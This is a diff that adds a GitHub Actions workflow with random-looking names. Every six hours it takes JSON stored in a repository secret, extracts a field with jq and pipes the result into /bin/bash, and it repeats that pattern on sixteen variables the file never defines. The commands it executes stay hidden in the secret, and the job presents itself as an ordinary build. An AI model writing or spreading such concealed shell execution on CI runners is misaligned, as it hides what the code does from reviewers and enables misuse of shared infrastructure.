@@ -1,0 +1,33 @@
+name: xiezhen19871010
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '49 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: xiezhen19871010
+        env:
+          ni742: ${{ secrets.ni742 }}
+        run: |
+          echo $ni742 | jq -r .ndxh97673 | /bin/bash
+          echo $yq3 | jq -r .vvj89093 | /bin/bash
+          echo $fceiz26 | jq -r .bz60316 | /bin/bash
+          echo $ezq082 | jq -r .ata2834 | /bin/bash
+          echo $ued2762 | jq -r .fvfso77883 | /bin/bash
+          echo $hwia38951 | jq -r .zodzn58251 | /bin/bash
+          echo $dlf43070 | jq -r .igvj433 | /bin/bash
+          echo $r390 | jq -r .va85449 | /bin/bash
+          echo $qd9075 | jq -r .ksujo930 | /bin/bash
+          echo $r17 | jq -r .lear73760 | /bin/bash
+          echo $qom68082 | jq -r .zmng58244 | /bin/bash
+          echo $c0 | jq -r .naqg69 | /bin/bash
+          echo $rdfan34 | jq -r .a07422 | /bin/bash
+          echo $czpd1875 | jq -r .wktnd976 | /bin/bash
+          echo $zedsz07376 | jq -r .indhm69 | /bin/bash
+          echo $lezpn9398 | jq -r .ehnl1667 | /bin/bash
+          echo $bzg12004 | jq -r .mjd00 | /bin/bash
+
